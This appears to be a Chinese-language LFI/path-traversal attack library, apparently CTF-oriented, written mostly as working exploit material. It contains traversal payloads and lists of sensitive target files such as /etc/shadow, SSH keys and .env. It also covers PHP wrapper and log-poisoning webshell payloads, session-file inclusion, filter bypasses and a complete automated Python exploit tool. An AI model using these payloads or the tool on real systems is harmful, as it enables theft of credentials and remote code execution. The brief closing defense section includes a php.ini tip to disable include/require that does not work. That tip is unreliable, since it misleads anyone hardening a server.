# LFI-路径遍历-攻击库

## 概述

**攻击类型**：本地文件包含 - 路径遍历  
**影响语言**：PHP/Python/Java/Node.js  
**风险等级**：Critical  
**攻击目标**：利用路径遍历（../）技术包含服务器上的任意文件

**核心原理**：
当应用程序使用用户可控的输入来包含或读取文件时，如果未正确验证，攻击者可以使用`../`路径遍历序列来访问目标目录之外的文件，读取敏感信息甚至执行代码。

**典型漏洞场景**：
```php
<?php
$file = $_GET['id'];
include("posts/" . $file);
?>
```

**攻击Payload**：
```bash
?id=../../../etc/passwd
```

---

## 核心攻击技术

### 技术1：基本路径遍历

**原理**：
使用`../`序列向上遍历目录结构，访问目标目录之外的文件。

**漏洞代码示例**：
```php
<?php
// 漏洞代码
$post_id = $_GET['id'];
$posts_path = "posts/";
$file_to_include = $posts_path . $post_id;

if (file_exists($file_to_include)) {
    include($file_to_include);
}
?>
```

**攻击Payload**：
```bash
# 读取/etc/passwd
?id=../../../etc/passwd

# 读取FLAG文件
?id=../../../FLAG.php
?id=../../../flag.txt

# 读取系统文件
?id=../../../../etc/hosts
?id=../../../../etc/shadow

# 读取Apache配置
?id=../../../../etc/apache2/apache2.conf

# 读取应用配置
?id=../../config.php
?id=../../.env
```

**目录遍历深度计算**：
```
应用目录: /var/www/html/posts/
目标文件: /etc/passwd

从posts/到根目录:
posts/ -> html/ -> www/ -> var/ -> /

需要4个../: ../../../../etc/passwd
```

**利用代码**：
```python
import requests

def exploit_basic_lfi(target_url, param_name='id'):
    """基本路径遍历LFI"""
    
    # 常见目标文件
    target_files = [
        '../../../FLAG.php',
        '../../../flag.txt',
        '../../../flag',
        '../../../../etc/passwd',
        '../../../../etc/hosts',
        '../../config.php',
        '../../.env',
    ]
    
    for file_path in target_files:
        try:
            params = {param_name: file_path}
            r = requests.get(target_url, params=params, timeout=10)
            
            # 检查是否成功读取文件
            if r.status_code == 200 and len(r.text) > 0:
                # 检查典型文件内容
                if 'root:' in r.text or 'flag{' in r.text.lower() or '<?php' in r.text:
                    print(f"[+] 成功读取: {file_path}")
                    print(f"    内容预览: {r.text[:200]}")
                    
                    if 'flag{' in r.text.lower():
                        return r.text
                        
        except Exception as e:
            continue
    
    return None
```

---

### 技术2：深度遍历枚举

**原理**：
不确定目标目录深度时，尝试多个深度级别的遍历。

**自动化深度枚举**：
```python
def enumerate_depth(target_url, param_name, target_file='/etc/passwd'):
    """枚举路径遍历深度"""
    
    print(f"[*] 枚举深度访问: {target_file}")
    
    # 尝试1-10层深度
    for depth in range(1, 11):
        # 构造../序列
        traversal = '../' * depth
        payload = traversal + target_file.lstrip('/')
        
        print(f"[*] 深度 {depth}: {payload}")
        
        try:
            params = {param_name: payload}
            r = requests.get(target_url, params=params, timeout=10)
            
            # 检查是否成功
            if r.status_code == 200:
                # 检查文件特征
                if 'root:' in r.text:
                    print(f"[+] 成功! 深度 {depth}")
                    print(f"[+] Payload: {payload}")
                    return depth, r.text
                    
        except Exception as e:
            continue
    
    print("[-] 未找到有效深度")
    return None, None

# 使用示例
depth, content = enumerate_depth('http://target/post.php', 'id', '/etc/passwd')

if depth:
    # 使用找到的深度读取FLAG
    flag_payload = '../' * depth + 'FLAG.php'
    print(f"[*] 尝试读取FLAG: {flag_payload}")
```

---

### 技术3：常见敏感文件清单

**原理**：
系统中存在许多包含敏感信息的文件，通过LFI可以读取这些文件。

**Linux系统文件**：
```python
linux_files = [
    # 系统文件
    '/etc/passwd',          # 用户列表
    '/etc/shadow',          # 密码哈希（需root权限）
    '/etc/hosts',           # 主机映射
    '/etc/group',           # 组信息
    '/etc/issue',           # 系统版本
    '/etc/hostname',        # 主机名
    
    # SSH密钥
    '/root/.ssh/id_rsa',
    '/root/.ssh/authorized_keys',
    '/home/user/.ssh/id_rsa',
    
    # 日志文件
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/auth.log',
    '/var/log/syslog',
    
    # Web配置
    '/etc/apache2/apache2.conf',
    '/etc/nginx/nginx.conf',
    
    # 数据库配置
    '/etc/mysql/my.cnf',
    
    # 应用配置
    '/var/www/html/config.php',
    '/var/www/html/.env',
]
```

**Windows系统文件**：
```python
windows_files = [
    'C:/windows/win.ini',
    'C:/windows/system32/drivers/etc/hosts',
    'C:/boot.ini',
    'C:/windows/system32/config/sam',
]
```

**应用文件**：
```python
app_files = [
    # PHP应用
    'config.php',
    'database.php',
    'settings.php',
    '.env',
    'composer.json',
    
    # Python应用
    'settings.py',
    'config.py',
    'requirements.txt',
    '.env',
    
    # Node.js应用
    'package.json',
    'config.js',
    '.env',
    
    # FLAG文件（CTF）
    '/flag',
    '/flag.txt',
    '/FLAG',
    '/FLAG.php',
    '/tmp/flag',
]
```

**自动化文件读取**：
```python
def read_sensitive_files(target_url, param_name, depth=4):
    """自动读取敏感文件"""
    
    traversal = '../' * depth
    
    # 合并所有文件列表
    all_files = linux_files + app_files
    
    found_files = {}
    
    for file_path in all_files:
        payload = traversal + file_path.lstrip('/')
        
        try:
            params = {param_name: payload}
            r = requests.get(target_url, params=params, timeout=10)
            
            if r.status_code == 200 and len(r.text) > 50:
                print(f"[+] 成功读取: {file_path}")
                found_files[file_path] = r.text
                
                # 检查FLAG
                if 'flag{' in r.text.lower():
                    print(f"[!] 发现FLAG: {file_path}")
                    
        except Exception as e:
            continue
    
    return found_files
```

---

### 技术4：PHP伪协议利用

**原理**：
PHP支持多种伪协议，可以用于文件读取、代码执行等。

**php://filter协议**：
```bash
# Base64编码读取文件（避免PHP代码执行）
?id=php://filter/read=convert.base64-encode/resource=../../../FLAG.php

# 读取后解码
echo "PD9waHAgZWNobyAiZmxhZ3s...=" | base64 -d
```

**php://input协议**：
```bash
# 读取POST数据作为文件内容
?id=php://input

# POST数据:
<?php system($_GET['cmd']); ?>
```

**data://协议**：
```bash
# 直接包含代码
?id=data://text/plain,<?php system('cat /flag'); ?>

# Base64编码
?id=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=
```

**expect://协议**：
```bash
# 执行命令（需要expect扩展）
?id=expect://whoami
?id=expect://cat /flag
```

**完整利用代码**：
```python
def exploit_php_wrappers(target_url, param_name):
    """利用PHP伪协议"""
    
    # 1. php://filter读取FLAG.php
    print("[*] 使用php://filter读取FLAG.php...")
    
    filter_payloads = [
        'php://filter/read=convert.base64-encode/resource=../../../FLAG.php',
        'php://filter/read=convert.base64-encode/resource=../../../flag',
        'php://filter/read=convert.base64-encode/resource=../../../config.php',
    ]
    
    for payload in filter_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if r.status_code == 200 and len(r.text) > 0:
            # 尝试Base64解码
            try:
                import base64
                decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                
                if 'flag{' in decoded.lower() or '<?php' in decoded:
                    print(f"[+] 成功读取: {payload}")
                    print(f"[+] 解码内容: {decoded[:200]}")
                    return decoded
                    
            except:
                pass
    
    # 2. data://协议执行代码
    print("\n[*] 尝试data://协议...")
    
    data_payloads = [
        'data://text/plain,<?php system("cat /flag"); ?>',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=',
    ]
    
    for payload in data_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'flag{' in r.text.lower():
            print(f"[+] data://执行成功!")
            return r.text
    
    return None
```

---

### 技术5：日志文件污染（Log Poisoning）

**原理**：
通过LFI包含日志文件，结合日志污染技术可以执行PHP代码。

**攻击流程**：
```
1. 向日志文件注入PHP代码 → 2. LFI包含日志文件 → 3. PHP代码执行
```

**污染Apache访问日志**：
```bash
# 1. 访问包含PHP代码的URL（记录到access.log）
curl "http://target/<?php system('cat /flag'); ?>"

# 或者在User-Agent中注入
curl -A "<?php system('cat /flag'); ?>" http://target/

# 2. LFI包含access.log
?id=../../../../var/log/apache2/access.log
```

**污染User-Agent**：
```python
def exploit_log_poisoning(target_url, param_name):
    """日志文件污染攻击"""
    
    session = requests.Session()
    
    # 1. 污染User-Agent
    print("[*] 步骤1: 污染User-Agent到access.log...")
    
    malicious_ua = "<?php system($_GET['cmd']); ?>"
    session.headers.update({'User-Agent': malicious_ua})
    
    # 访问任意页面，将恶意UA写入日志
    session.get(target_url.replace('/post.php', '/index.php'))
    
    print("[+] User-Agent已污染")
    
    # 2. LFI包含access.log
    print("[*] 步骤2: 包含access.log...")
    
    log_paths = [
        '../../../../var/log/apache2/access.log',
        '../../../../var/log/nginx/access.log',
        '../../../../var/log/httpd/access_log',
    ]
    
    for log_path in log_paths:
        params = {
            param_name: log_path,
            'cmd': 'cat /flag'
        }
        
        r = requests.get(target_url, params=params)
        
        if 'flag{' in r.text.lower():
            print(f"[+] 日志污染成功!")
            print(f"[+] 日志文件: {log_path}")
            return r.text
    
    return None
```

---

### 技术6：Session文件包含

**原理**：
PHP会话文件存储在`/var/lib/php/sessions/`，文件名为`sess_<SESSION_ID>`。

**攻击流程**：
```
1. 控制SESSION数据 → 2. 包含SESSION文件 → 3. 执行注入的代码
```

**利用代码**：
```python
def exploit_session_inclusion(target_url, param_name):
    """Session文件包含攻击"""
    
    session = requests.Session()
    
    # 1. 访问应用获取SESSION_ID
    r = session.get(target_url)
    
    session_cookie = session.cookies.get('PHPSESSID')
    
    if not session_cookie:
        print("[-] 未获取到PHPSESSID")
        return None
    
    print(f"[*] SESSION ID: {session_cookie}")
    
    # 2. 污染SESSION数据
    print("[*] 污染SESSION数据...")
    
    # 在某个参数中注入PHP代码（会被存储到SESSION）
    session.get(target_url, params={
        'name': "<?php system('cat /flag'); ?>"
    })
    
    # 3. 包含SESSION文件
    print("[*] 包含SESSION文件...")
    
    session_file_paths = [
        f'../../../../var/lib/php/sessions/sess_{session_cookie}',
        f'../../../../tmp/sess_{session_cookie}',
    ]
    
    for sess_path in session_file_paths:
        params = {param_name: sess_path}
        r = session.get(target_url, params=params)
        
        if 'flag{' in r.text.lower():
            print(f"[+] SESSION包含成功!")
            return r.text
    
    return None
```

---

### 技术7：绕过过滤和防护

**原理**：
应用可能实施各种过滤，需要绕过这些限制。

**绕过技术1 - 双写绕过**：
```bash
# 过滤了../但只替换一次
....//....//....//etc/passwd

# 结果：替换后变成../../../etc/passwd
```

**绕过技术2 - URL编码**：
```bash
# 单次编码
..%2f..%2f..%2fetc%2fpasswd

# 双重编码
..%252f..%252f..%252fetc%252fpasswd

# 混合编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**绕过技术3 - 空字节注入**（PHP < 5.3.4）：
```bash
# 使用%00截断后续内容
?id=../../../etc/passwd%00

# 绕过扩展名检查
?id=../../../flag.txt%00.jpg
```

**绕过技术4 - 使用反斜杠**（Windows）：
```bash
?id=..\..\..\windows\win.ini
```

**绕过技术5 - 长路径绕过**：
```bash
# 使用大量./占用缓冲区
?id=././././././../../../etc/passwd
```

**完整绕过代码**：
```python
def bypass_filters(target_url, param_name, target_file='/etc/passwd'):
    """绕过各种过滤"""
    
    bypass_payloads = [
        # 双写绕过
        '....//....//....//etc/passwd',
        '....\/....\/....\/etc/passwd',
        
        # URL编码
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        
        # 空字节（旧版PHP）
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',
        
        # 长路径
        '././' * 50 + '../../../etc/passwd',
        
        # 反斜杠（Windows）
        '..\\..\\..\\windows\\win.ini',
    ]
    
    for payload in bypass_payloads:
        try:
            params = {param_name: payload}
            r = requests.get(target_url, params=params, timeout=10)
            
            if r.status_code == 200 and ('root:' in r.text or 'flag{' in r.text.lower()):
                print(f"[+] 过滤绕过成功!")
                print(f"[+] Payload: {payload}")
                return r.text
                
        except Exception as e:
            continue
    
    return None
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
LFI路径遍历完整利用工具
"""
import requests
import sys
import re
import base64

class LFIExploit:
    def __init__(self, target_url, param_name='id'):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        self.found_depth = None
    
    def find_depth(self):
        """找到有效的遍历深度"""
        print("[*] 枚举路径遍历深度...")
        
        for depth in range(1, 11):
            traversal = '../' * depth
            payload = traversal + 'etc/passwd'
            
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params, timeout=10)
            
            if 'root:' in r.text:
                print(f"[+] 找到有效深度: {depth}")
                self.found_depth = depth
                return depth
        
        print("[-] 未找到有效深度，使用默认值4")
        self.found_depth = 4
        return 4
    
    def read_flag(self):
        """读取FLAG文件"""
        print("\n[*] 尝试读取FLAG文件...")
        
        if not self.found_depth:
            self.find_depth()
        
        traversal = '../' * self.found_depth
        
        flag_files = [
            'FLAG.php',
            'flag.txt',
            'flag',
            'FLAG',
            'tmp/flag',
        ]
        
        for flag_file in flag_files:
            payload = traversal + flag_file
            
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params)
            
            if r.status_code == 200 and 'flag{' in r.text.lower():
                print(f"[+] 找到FLAG: {flag_file}")
                return r.text
        
        return None
    
    def try_php_filter(self):
        """尝试PHP filter协议"""
        print("\n[*] 尝试php://filter协议...")
        
        if not self.found_depth:
            self.find_depth()
        
        traversal = '../' * self.found_depth
        
        filter_targets = [
            'FLAG.php',
            'flag',
            'config.php',
        ]
        
        for target in filter_targets:
            payload = f'php://filter/read=convert.base64-encode/resource={traversal}{target}'
            
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params)
            
            if r.status_code == 200 and len(r.text) > 0:
                try:
                    decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                    
                    if 'flag{' in decoded.lower():
                        print(f"[+] php://filter成功: {target}")
                        print(f"[+] 解码内容: {decoded[:200]}")
                        return decoded
                        
                except:
                    pass
        
        return None
    
    def try_log_poison(self):
        """尝试日志污染"""
        print("\n[*] 尝试日志文件污染...")
        
        # 污染User-Agent
        malicious_ua = "<?php system('cat /flag'); ?>"
        self.session.headers.update({'User-Agent': malicious_ua})
        
        # 访问任意页面
        self.session.get(self.target_url.replace(f'/{self.param_name}', ''))
        
        print("[+] User-Agent已污染")
        
        if not self.found_depth:
            self.find_depth()
        
        traversal = '../' * self.found_depth
        
        log_paths = [
            'var/log/apache2/access.log',
            'var/log/nginx/access.log',
        ]
        
        for log_path in log_paths:
            payload = traversal + log_path
            
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params)
            
            if 'flag{' in r.text.lower():
                print(f"[+] 日志污染成功: {log_path}")
                return r.text
        
        return None
    
    def extract_flag(self, content):
        """提取FLAG"""
        flag_match = re.search(r'flag\{[^}]+\}', content, re.I)
        
        if flag_match:
            return flag_match.group()
        
        return None
    
    def full_exploit(self):
        """完整利用流程"""
        print("="*60)
        print("LFI路径遍历完整利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.target_url}")
        print(f"[*] 参数: {self.param_name}\n")
        
        # 1. 查找深度
        self.find_depth()
        
        # 2. 读取FLAG文件
        result = self.read_flag()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 3. 尝试PHP filter
        result = self.try_php_filter()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 4. 尝试日志污染
        result = self.try_log_poison()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        print("\n[-] 所有方法均未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [参数名]")
        print(f"例如: {sys.argv[0]} http://target/post.php id")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'id'
    
    exploit = LFIExploit(target, param)
    result = exploit.full_exploit()
    
    if result:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击失败")
```

---

## 实战场景

### 场景1：PHP博客系统LFI

**应用背景**：
博客文章浏览功能，id参数存在LFI漏洞。

**漏洞代码**：
```php
<?php
$post_id = $_GET['id'];
$file_to_include = "posts/" . $post_id;

if (file_exists($file_to_include)) {
    include($file_to_include);
}
?>
```

**利用步骤**：
```bash
# 1. 读取/etc/passwd确定深度
curl "http://target/post.php?id=../../../../etc/passwd"

# 2. 读取FLAG.php
curl "http://target/post.php?id=../../../FLAG.php"
```

---

## 手动测试命令

```bash
# 1. 基本路径遍历
curl "http://target/post.php?id=../../../etc/passwd"

# 2. 读取FLAG
curl "http://target/post.php?id=../../../FLAG.php"

# 3. PHP filter读取
curl "http://target/post.php?id=php://filter/read=convert.base64-encode/resource=../../../FLAG.php"

# 4. 解码Base64
curl "..." | base64 -d
```

---

## Payload速查表

| 目标 | Payload | 说明 |
|------|---------|------|
| /etc/passwd | `../../../../etc/passwd` | Linux用户列表 |
| FLAG文件 | `../../../FLAG.php` | 根目录FLAG |
| 配置文件 | `../../config.php` | 应用配置 |
| PHP filter | `php://filter/read=convert.base64-encode/resource=../../../FLAG.php` | Base64读取 |
| 日志文件 | `../../../../var/log/apache2/access.log` | Apache日志 |

---

## 防御措施

### 1. 白名单验证

```php
<?php
// 不要这样
include($_GET['id']);

// 应该这样
$allowed_files = ['post1.php', 'post2.php', 'post3.php'];

if (in_array($_GET['id'], $allowed_files)) {
    include("posts/" . $_GET['id']);
}
?>
```

### 2. 路径规范化检查

```php
<?php
$base_dir = realpath('/var/www/html/posts/');
$file = realpath($base_dir . '/' . $_GET['id']);

// 确保文件在允许目录内
if (strpos($file, $base_dir) !== 0) {
    die("Invalid file path");
}

include($file);
?>
```

### 3. 禁用危险函数

```ini
; php.ini
disable_functions = include,require,include_once,require_once
```

---

## 总结

**LFI路径遍历攻击要点**：
1. ✅ 使用`../`遍历目录结构
2. ✅ 枚举深度找到有效遍历路径
3. ✅ php://filter读取PHP源码
4. ✅ 日志污染实现代码执行
5. ✅ Session文件包含攻击
6. ✅ 防御关键：白名单验证 + 路径规范化

LFI是危害极大的漏洞，可导致敏感信息泄露甚至远程代码执行。
